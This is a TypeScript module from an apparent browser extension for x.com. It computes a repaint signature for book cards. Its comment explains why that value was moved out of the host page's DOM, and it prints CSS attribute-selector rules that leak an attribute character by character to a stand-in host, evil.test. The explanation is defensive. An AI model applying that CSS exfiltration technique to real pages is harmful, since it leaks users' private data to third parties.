import type { Card } from './catchTray';

/**
 * Everything the card's DOM depends on, so a repaint only rebuilds what actually changed.
 *
 * ⚠ **THIS USED TO BE WRITTEN TO `el.dataset['sig']`** — an attribute on an element living
 * in **x.com's own light DOM**. `OPENWORK.md` item 52, TM-9.
 *
 * Read what it contains: the state, the message, the picture, and per book the **title, the
 * cover URL, which pile it is already in and which pile you just put it in.** That is the
 * private half of the product, published as an attribute on somebody else's page.
 *
 * **And it takes no script to read.** CSS attribute selectors do it alone:
 *
 *     [data-sig^="a"] { background: url(https://evil.test/a) }
 *     [data-sig^="b"] { background: url(https://evil.test/b) }
 *
 * One rule per candidate prefix and the page recovers the value a character at a time from
 * its own request log — so no CSP script rule applies, and the `isTrusted` check that guards
 * every other way into this tray (`realClick.ts`, item 41) never runs.
 *
 * **It never needed to be in the DOM.** Its only reader is a repaint check — *has this card
 * changed since I drew it?* — and `paintTray` already holds a record per card in `drawn`.
 * The value lives there now, where the host page has nothing to address it with.
 *
 * It is a MODULE rather than a local function for the reason everything else in this
 * directory is: `content.ts` cannot be imported by a test, so a decision written inline
 * there is a decision no test can reach.
 */
export function signature(c: Card): string {
  // JSON, NOT `.join()`. The original joined with commas, so two books titled "A" and "B"
  // and one book titled "A,B" produced the SAME signature — and a collision here is a card
  // that silently stops repainting, leaving a stale answer on screen.
  //
  // A NUL separator was written first and REJECTED, by `tools/control-bytes.mjs` catching a
  // literal control byte in this file minutes after it was written. §5 T19 is that exact
  // byte reaching `generatedCover.ts`. JSON is unambiguous by construction and needs no
  // character that cannot be typed — which is the better answer, not the safer spelling of
  // the worse one.
  return JSON.stringify([
    c.state,
    c.text,
    c.source ?? '',
    c.image ?? '',
    c.candidates.map((x) => [
      x.book.title,
      x.book.coverUrl ?? '',
      x.shelvedIn ?? '',
      x.savedTo ?? '',
    ]),
  ]);
}
